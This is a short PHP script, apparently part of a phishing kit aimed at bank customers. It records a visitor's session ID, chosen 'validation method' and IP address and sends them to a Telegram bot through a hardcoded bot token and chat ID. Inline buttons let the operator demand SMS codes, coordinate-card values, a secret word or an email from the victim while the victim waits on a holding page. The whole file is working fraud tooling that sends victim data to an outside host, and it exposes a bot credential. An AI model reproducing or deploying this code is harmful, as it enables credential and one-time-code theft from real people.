<?php
session_start();

// Aseguramos que exista un nombre de usuario único
if (!isset($_SESSION['usuario'])) {
    $_SESSION['usuario'] = 'cli_' . rand(1000, 9999); // Si no lo envió desde antes, se crea uno
}

$usuario = $_SESSION['usuario'];
$tipo = $_POST['tipo'] ?? 'no especificado';

// Obtener IP
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

// Token y chat_id
$token = "7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c";
$chat_id = "5157616506";

// Botones para controlar desde Telegram
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
            ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"]
        ],
        [
            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"],
            ["text" => "📧 Correo", "callback_data" => "CORREO|$usuario"]
        ]
    ]
];

// Enviar mensaje a Telegram
$mensaje = "✅ Cliente seleccionó método de validación: $tipo\n👤 Usuario: $usuario\n🌐 IP: $ip";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
]));

// Redirigir al cliente a espera.php
header("Location: espera.php");
exit;
?>
